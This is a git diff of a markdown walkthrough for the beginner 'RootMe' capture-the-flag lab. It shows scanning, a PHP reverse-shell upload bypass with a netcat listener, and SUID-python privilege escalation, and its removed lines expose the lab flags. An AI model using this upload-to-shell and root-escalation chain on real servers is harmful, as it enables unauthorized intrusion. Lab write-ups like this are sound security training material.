@@ -15,32 +15,28 @@ A ctf for beginners, can you root me?
 
 | Title | IP Address |
 | :---- | :---- |
-| RootMe | 10.10.196.130 |
+| RootMe | 1*.**.***.*** |
 
 ## Reconnaissance
 
 ```bash
-sudo nmap -A -vv -T4 -oA initial 10.10.196.130 
+sudo nmap -A -vv -T4 -oA initial 1*.**.***.*** 
 ```
 
-> `22/tcp open ssh syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
+> `22/tcp open *** syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
 
-> `80/tcp open http syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))`
-
-Result: [initial.nmap](initial.nmap)
-
-> `80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))`
+> `80/tcp open http syn-ack ttl 61 Apache httpd 2.*.** ((Ubuntu))`
 
 ```bash
-gobuster dir -u 10.10.196.130:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 100
+gobuster dir -u 1*.**.***.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 100
 ```
 
 > ```
-> /uploads              (Status: 301) [Size: 316] [--> http://10.10.196.130/uploads/]
+> /u******              (Status: 301) [Size: 316] [--> http://1*.**.***.***/u******/]
 > /index.php            (Status: 200) [Size: 616]                                    
-> /css                  (Status: 301) [Size: 312] [--> http://10.10.196.130/css/]    
-> /js                   (Status: 301) [Size: 311] [--> http://10.10.196.130/js/]     
-> /panel                (Status: 301) [Size: 314] [--> http://10.10.196.130/panel/]  
+> /css                  (Status: 301) [Size: 312] [--> http://1*.**.***.***/css/]    
+> /js                   (Status: 301) [Size: 311] [--> http://1*.**.***.***/js/]     
+> /p****                (Status: 301) [Size: 314] [--> http://1*.**.***.***/p****/]  
 > /server-status        (Status: 403) [Size: 278]
 > ```
 
@@ -52,7 +48,7 @@ Copy and modify `/usr/share/webshells/php/php-reverse-shell.php`
 
 ```php
 // php-reverse-shell.php5
-$ip = '10.6.31.75';  // CHANGE THIS
+$ip = '1*.*.**.**';  // CHANGE THIS
 $port = 80;       // CHANGE THIS
 ```
 
@@ -60,25 +56,27 @@ $port = 80;       // CHANGE THIS
 mv php-reverse-shell.php php-reverse-shell.php5
 ```
 
-Upload to: `http://10.10.196.130/panel/`
+Upload to: `http://1*.**.***.***/p****/`
 
 ```bash
 nc -lvnp 80
 ```
 
-Go to: `http://10.10.196.130/uploads/php-reverse-shell.php5`
+Go to: `http://1*.**.***.***/u******/php-reverse-shell.php5`
+
+RHOST:
 
 ```bash
-find / -type f -name user.txt 2>/dev/null
+find / -type f -name u***.*** 2>/dev/null
 ```
 
-> `/var/www/user.txt`
+> `/var/www/u***.***`
 
 ```bash
-cat /var/www/user.txt
+cat /var/www/u***.***
 ```
 
-> `THM{y0u_g0t_a_sh3ll}`
+> `THM{***_***_*_*****}`
 
 ## Privilege escalation
 
@@ -86,19 +84,19 @@ cat /var/www/user.txt
 find / -perm -4000 2>/dev/null
 ```
 
-> `/usr/bin/python`
+> `/***/***/******`
 
-Using [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid):
-
-```bash
-python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-find / -type f -name root.txt
-```
-
-> `/root/root.txt`
+Using [GTFOBins](https://gtfobins.github.io):
 
 ```bash
-cat /root/root.txt
+p***** -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+find / -type f -name r***.***
 ```
 
-> `THM{pr1v1l3g3_3sc4l4t10n}`
+> `/r***/root.txt`
+
+```bash
+cat /r***/root.txt
+```
+
+> `THM{*********_**********}`
